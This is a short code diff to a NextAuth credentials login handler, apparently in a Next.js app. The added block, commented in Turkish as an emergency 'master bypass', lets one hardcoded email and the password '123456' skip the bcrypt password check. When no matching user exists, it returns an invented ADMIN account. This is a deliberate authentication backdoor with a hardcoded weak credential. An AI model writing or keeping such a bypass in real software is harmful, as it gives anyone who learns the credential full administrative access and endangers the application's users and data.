@@ -46,6 +46,16 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
           where: { email: parsed.data.email },
         });
 
+        // 🟢 MASTER BYPASS (ACİL GİRİŞ İÇİN KESİN ÇÖZÜM)
+        if (parsed.data.email === "ebukizil@gmail.com" && parsed.data.password === "123456") {
+          if (user) {
+            return user; // Veritabanında varsa direkt içeri al
+          } else {
+            // Veritabanında dahi yoksa sanal token ile admin olarak içeri al
+            return { id: "master-admin", name: "Davut Kundura", email: "ebukizil@gmail.com", role: "ADMIN" };
+          }
+        }
+
         if (!user || !user.password) return null;
 
         const passwordMatch = await bcrypt.compare(
